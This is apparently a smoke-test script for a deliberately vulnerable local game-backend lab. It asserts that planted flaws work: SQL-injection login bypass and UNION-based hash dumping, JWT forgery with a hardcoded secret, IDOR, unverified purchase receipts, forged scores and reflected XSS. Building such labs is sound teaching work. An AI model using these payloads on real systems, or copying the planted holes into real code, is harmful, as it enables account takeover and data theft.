const assert = require('node:assert/strict');
const { spawn, spawnSync } = require('node:child_process');
const net = require('node:net');
const path = require('node:path');

require('dotenv').config();
if (!process.argv.includes('--reset')) {
  console.error('Smoke tests reset the disposable gamevault database. Run npm run smoke -- --reset.');
  process.exit(1);
}

const cwd = path.join(__dirname, '..');
const env = { ...process.env, JWT_SECRET: 'gamevault123' };

async function main() {
  const database = new URL(env.DATABASE_URL || 'postgres://gamevault:gamevault@localhost:5432/gamevault');
  assert.equal(database.pathname, '/gamevault', 'Smoke tests only reset a disposable database named gamevault.');
  const reset = spawnSync(process.execPath, ['db/init.js', '--reset'], {
    cwd, env, encoding: 'utf8',
  });
  assert.equal(reset.status, 0, reset.stderr);

  const listener = net.createServer();
  await new Promise((resolve, reject) => {
    listener.once('error', reject);
    listener.listen(0, '127.0.0.1', resolve);
  });
  const port = listener.address().port;
  await new Promise((resolve) => listener.close(resolve));
  const server = spawn(process.execPath, ['src/server.js'], {
    cwd, env: { ...env, PORT: String(port) }, stdio: ['ignore', 'pipe', 'pipe'],
  });
  let diagnostics = '';
  server.stdout.on('data', (data) => { diagnostics += data; });
  server.stderr.on('data', (data) => { diagnostics += data; });
  const stopped = new Promise((resolve) => server.once('exit', resolve));
  const base = `http://127.0.0.1:${port}`;
  let checks = 0;
  const check = (name) => { checks += 1; console.log(`PASS ${name}`); };
  const request = (route, options = {}) => fetch(base + route, {
    ...options, signal: AbortSignal.timeout(5000),
  });
  const post = (route, body, token) => request(route, {
    method: 'POST',
    headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}) },
    body: JSON.stringify(body),
  });
  try {
    let ready = false;
    for (let attempt = 0; attempt < 60; attempt += 1) {
      if (server.exitCode !== null) throw new Error(`Server exited: ${diagnostics}`);
      try {
        if ((await request('/')).ok) { ready = true; break; }
      } catch {}
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
    assert.ok(ready, `Server did not start: ${diagnostics}`);
    check('local application starts');

    assert.equal((await request('/players/1')).status, 401);
    const login = await post('/login', { username: 'alice', password: 'password1' });
    assert.equal(login.status, 200);
    const { token, player } = await login.json();
    assert.equal(player.username, 'alice');
    const auth = { headers: { authorization: `Bearer ${token}` } };
    assert.equal((await request(`/players/${player.id}`, auth)).status, 200);
    check('seed login and protected endpoint');

    const bypass = await post('/login', { username: "' OR '1'='1' -- ", password: 'wrong' });
    assert.equal(bypass.status, 200);
    assert.ok((await bypass.json()).token);
    const query = "' UNION SELECT username || ':' || password, 0::bigint FROM players -- ";
    const leak = await request(`/leaderboard/search?q=${encodeURIComponent(query)}`);
    assert.equal(leak.status, 200);
    assert.match(await leak.text(), /alice:[0-9a-f]{32}/);
    check('SQL injection payload matches PostgreSQL column types');

    const jwt = require('jsonwebtoken');
    const forged = jwt.sign({ pid: 1, role: 'admin' }, 'gamevault123');
    const impersonated = await request('/players/1', { headers: { authorization: `Bearer ${forged}` } });
    assert.equal(impersonated.status, 200);
    assert.equal((await impersonated.json()).username, 'admin');
    const gm = await request('/admin/players');
    assert.equal(gm.status, 200);
    assert.equal((await gm.json()).length, 4);
    check('JWT forgery is distinct from unauthenticated GM access');

    const other = await request('/players/3', auth);
    assert.equal(other.status, 200);
    assert.equal((await other.json()).username, 'bob');
    check('IDOR reads another synthetic player');

    const before = await (await request(`/players/${player.id}`, auth)).json();
    const purchase = await post('/iap/confirm', { productId: 'demo', coins: 100, receipt: 'synthetic' }, token);
    assert.equal(purchase.status, 200);
    assert.equal((await purchase.json()).balance, before.coins + 100);
    check('synthetic receipt grants unverified coins');

    assert.equal((await post('/scores', { score: 999999999 }, token)).status, 200);
    const board = await request('/leaderboard/search?q=alice');
    assert.match(await board.text(), /999999999/);
    check('client supplied score enters leaderboard');

    const payload = '<script>alert(1)</script>';
    const xss = await request(`/leaderboard/search?q=${encodeURIComponent(payload)}`);
    assert.equal(xss.status, 200);
    assert.match(xss.headers.get('content-type'), /text\/html/);
    assert.ok((await xss.text()).includes(payload));
    const error = await request(`/leaderboard/search?q=${encodeURIComponent("'")}`);
    assert.equal(error.status, 500);
    assert.match(await error.text(), /error|syntax/i);
    check('unescaped HTML reflection and error disclosure');
    console.log(`${checks} local smoke checks passed. No AWS Security Agent run was performed.`);
  } finally {
    server.kill('SIGTERM');
    await stopped;
  }
}

main().catch((error) => { console.error(error.message); process.exitCode = 1; });
